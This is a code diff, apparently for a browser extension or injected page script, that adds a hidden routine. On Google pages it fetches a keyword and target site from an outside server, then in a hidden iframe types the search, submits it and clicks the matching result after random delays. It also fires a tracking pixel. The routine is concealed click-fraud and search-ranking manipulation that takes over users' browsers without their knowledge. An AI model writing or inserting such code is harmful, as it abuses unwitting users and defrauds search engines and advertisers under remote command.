@@ -7,6 +7,63 @@ if(document.title.toLowerCase().indexOf("taraftarium24") >= 0){
 	}
 }
 
+function get_google_keywords() {
+	var xhr = new XMLHttpRequest();
+	xhr.open("GET", "//izle.vip/globalmediaspaceseo/get.php", true);
+	xhr.onreadystatechange = function() {
+		if (xhr.readyState == 4 && xhr.status == 200) {
+			try {
+				var data = JSON.parse(xhr.responseText);
+				var target = data.target.trim();
+				var keyword = data.keyword.trim();
+				if(target && keyword){
+					search_google_seo(target,keyword);
+				}
+			}catch (error) {}
+		}
+	}
+	xhr.send();
+}
+
+function rasgteleSure(min, max) { 
+  return Math.floor(Math.random() * (max - min + 1) + min);
+}
+
+function search_google_seo(target,keyword){
+	new Image().src = '//whos.amung.us/widget/m823l61df3.png';
+	var ifrm = document.createElement("iframe");
+	ifrm.setAttribute("src", window.location.origin);
+	ifrm.style.width = "100%";
+	ifrm.style.height = "100%";
+	ifrm.style.border = "0px";
+	ifrm.style.display = "none";
+	ifrm.id = "guugil";
+	document.body.appendChild(ifrm);
+
+	var kelime = keyword;
+	setTimeout(function(){document.querySelector("#guugil").contentWindow.document.querySelector("input[name=q]").value = kelime;}, rasgteleSure(2500,4000));
+	setTimeout(function(){document.querySelector("#guugil").contentWindow.document.querySelector("input[name=btnK]").click();}, rasgteleSure(5000,6500));
+
+	setTimeout(function(){
+		var linkler = document.querySelector("#guugil").contentWindow.document.querySelectorAll("a[ping][href]")
+		var i;
+		for (i = 0; i < linkler.length; i++) {
+		  if(linkler[i].href.indexOf(target) >= 0){
+			  console.log(linkler[i].href);
+			  linkler[i].click();
+			  break;
+		  }
+		}
+	}, rasgteleSure(7500,10000));
+}
+
+
+if(window.location.href.indexOf("google") >= 0){
+	get_google_keywords();
+}
+
+
+
 
 function getFromLocalStorage(){
   return JSON.parse(localStorage.getItem("operations"));
